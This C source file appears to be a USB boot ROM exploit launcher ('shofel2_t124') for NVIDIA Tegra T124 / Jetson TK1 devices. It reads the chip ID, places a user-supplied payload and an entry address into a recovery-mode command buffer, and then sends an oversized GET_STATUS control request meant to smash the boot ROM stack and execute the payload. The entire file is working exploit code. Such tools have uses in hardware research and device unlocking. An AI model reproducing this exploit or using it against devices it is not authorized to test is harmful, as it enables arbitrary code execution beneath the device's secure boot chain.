#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dirent.h>
#include <ctype.h>
#include <stdint.h>
#include "mini_libusb.h"

#define JETSON_TK1_VID 0x0955
#define JETSON_TK1_PID 0x7140

#define BOOTROM_USB_BUF_1       0x40004000
#define BOOTROM_USB_BUF_2       0x40008000
#define BOOTROM_SMASH_TARGET    0x4000DCD8
#define BOOTROM_SMASH_LEN       (BOOTROM_SMASH_TARGET - BOOTROM_USB_BUF_2)

#define USB_CTRL_DEVICE_ENDPOINT_TO_HOST 0x82
#define USB_CTRL_GET_STATUS 0x00
// #define USB_CTRL_GET_STATUS_LENGTH 0x1000
#define USB_CTRL_GET_STATUS_LENGTH BOOTROM_SMASH_LEN

#define RCM_EP1_IN      0x81
#define RCM_EP1_OUT     0x01
#define RCM_CHIP_ID_LEN 0x10
#define RCM_CMD_BUF_LEN 0x7000
#define RCM_CMD_BUF_PAYLOAD_INIT_POS 0x284
#define RCM_CMD_BUF_MEMCPY_RET_POS (RCM_CMD_BUF_PAYLOAD_INIT_POS + BOOTROM_SMASH_LEN - 0x30C - 0x4)

#define MAX_PAYLOAD_FILE_SIZE (RCM_CMD_BUF_MEMCPY_RET_POS - RCM_CMD_BUF_PAYLOAD_INIT_POS)

void print_hex_memory(void *mem, size_t size) {
  uint8_t *p = (uint8_t *)mem;
  for (int i = 0; i < size ; i++) {
    if (((i % 16) == 0) && i)
      printf("\n");
    printf("0x%02x ", p[i]);
  }
  printf("\n");
}


int main(int argc, char *argv[]) {

  int ret = 0;

  if (argc != 2) {
    printf("Error: invalid argument count. shofel2_t124 payload.bin\n");
    ret = -1;
    goto exit;
  }

  int rcm_usb_fd = open_RCM_usb((uint16_t)JETSON_TK1_VID, (uint16_t)JETSON_TK1_PID);

  // ---- INIT RCM ----
  uint8_t chip_id_buf[RCM_CHIP_ID_LEN];
  memset(&chip_id_buf, 0, sizeof (chip_id_buf));

  ret = send_bulk_txn( rcm_usb_fd, RCM_EP1_IN, RCM_CHIP_ID_LEN, chip_id_buf );
  if (ret) {
    printf("Error: Couldn't read Chip ID. Please reset T124 in RCM mode again.\n");
    goto exit;
  }
  printf("Chip ID: ");
  print_hex_memory(chip_id_buf, RCM_CHIP_ID_LEN);

  //-----------------------

  // ---- SEND PAYLOAD ----
  uint8_t rcm_cmd_buf[RCM_CMD_BUF_LEN];
  memset(rcm_cmd_buf, 0x00, sizeof(rcm_cmd_buf));
  
  const uint8_t rcm_cmd_len[4] = { 0x74, 0x22, 0x03, 0x00 }; // 0x32274 Bytes
  const uint8_t payload_entry[4] = {0x01, 0xe0, 0x00, 0x40}; // 0x4000E000|1 (|1 Thumb mode bit) 

  // TODO: Use IRAM space after memcpy return pos. Anyway, probably 22KB are enought for mostly of the payloads...
  uint8_t payload_file_buf[MAX_PAYLOAD_FILE_SIZE];
  int payload_file_fd = open(argv[1], O_RDONLY);
  if (payload_file_fd == -1) {
    printf("Error: Couldn't open the payload file.\n");
    ret = -1;
    goto exit;
  }
  struct stat payload_file_stat;
  fstat(payload_file_fd, &payload_file_stat);
  if (payload_file_stat.st_size > MAX_PAYLOAD_FILE_SIZE) {
    printf("Error: Payload file exceeds max payload size: %d bytes.\n", MAX_PAYLOAD_FILE_SIZE);
    ret = -1;
    goto exit;
  }

  uint32_t n_bytes = read(payload_file_fd, payload_file_buf, MAX_PAYLOAD_FILE_SIZE);

  memcpy(rcm_cmd_buf, rcm_cmd_len, 0x4);
  memcpy(&rcm_cmd_buf[RCM_CMD_BUF_PAYLOAD_INIT_POS], payload_file_buf, n_bytes);
  memcpy(&rcm_cmd_buf[RCM_CMD_BUF_MEMCPY_RET_POS], payload_entry, 0x4);

  ret = send_bulk_txn( rcm_usb_fd, RCM_EP1_OUT, RCM_CMD_BUF_LEN, rcm_cmd_buf );
  if (ret != 0) {
    printf("Error: Couldn't send RCM CMD.\n");
    goto exit;
  }
  //----------------------

  // ---- RUN EXPLOIT ----
  
    char data[0x7777];
    ret = send_control_txn( rcm_usb_fd, USB_CTRL_DEVICE_ENDPOINT_TO_HOST, USB_CTRL_GET_STATUS, USB_CTRL_GET_STATUS_LENGTH, data);
  if (ret == 0) {
    printf("Error: Hacky Get Status finished correctly... Not cool :-(\n");
//    print_hex_memory(hacky_get_status_buf.data, USB_CTRL_GET_STATUS_LENGTH);
    ret = -1;
    goto exit;
  }

  printf("Hacky Get Status returned error... Probably the stack got smashed, Congrats :-)\n");
  //----------------------

  ret = 0;

exit:
  if (rcm_usb_fd) close(rcm_usb_fd);
  if (payload_file_fd) close(payload_file_fd);
  return ret;

}

